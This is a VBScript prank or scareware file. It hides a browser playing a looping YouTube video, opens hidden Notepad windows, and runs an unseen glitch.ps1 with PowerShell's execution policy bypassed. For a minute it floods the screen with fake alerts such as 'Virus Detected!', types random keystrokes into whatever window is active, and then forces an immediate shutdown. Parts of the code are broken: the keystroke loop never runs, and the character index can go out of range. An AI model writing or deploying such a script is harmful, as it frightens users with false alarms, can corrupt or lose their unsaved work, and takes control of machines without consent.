Set WshShell = CreateObject("WScript.Shell")
Set ie = CreateObject("InternetExplorer.Application")

' Open YouTube in a hidden browser with loop enabled
ie.Visible = False
ie.Navigate "https://www.youtube.com/embed/uLghjAKpBMU?autoplay=1&loop=1&playlist=uLghjAKpBMU"

' Wait for the video to start loading
WScript.Sleep 2000

' Open 6 Notepad windows instantly
For i = 1 To 6
    WshShell.Run "notepad", 0, False
    WScript.Sleep 500
Next

' Start glitch effect using PowerShell
WshShell.Run "powershell -ExecutionPolicy Bypass -File glitch.ps1", 0, False

' Start flooding errors in parallel with a 5-millisecond delay
startTime = Timer
Do While Timer - startTime < 60
    Randomize
    errorMessages = Array("System Malfunction!", "Critical Error!", "Memory Overload!", "Virus Detected!", "Fatal System Fault!", "Device Failure!", "Unknown Process Running!", "Unauthorized Access Detected!")

    ' Loop through all error messages at once
    For i = 0 To UBound(errorMessages)
        iconTypes = Array(vbCritical, vbExclamation, vbQuestion, vbInformation)
        randIcon = iconTypes(Int(Rnd * 4))

        ' Launch multiple MsgBox windows without blocking execution
        WshShell.Run "mshta vbscript:msgbox(""" & errorMessages(i) & """, " & randIcon & ", ""System Alert"")", 0, False
    Next
    
    WScript.Sleep 5 ' **SUPER FAST ERROR FLOODING!**
Loop

' Typing loop for 60 seconds
Do While Timer - startTime < 60
    Randomize
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~"
    output = ""

    ' Generate random text
    For i = 1 To 20
        output = output & Mid(chars, Int((Len(chars) * Rnd) * Len(chars) + 1), 1)
    Next

    ' Randomly press Enter or Space
    specialKeys = Array("{ENTER}", " ")
    randKey = specialKeys(Int(Rnd * 2))

    ' Send the text
    WshShell.SendKeys output & randKey
    WScript.Sleep 300
Loop

' Shutdown after one minute
WshShell.Run "shutdown -s -t 0"
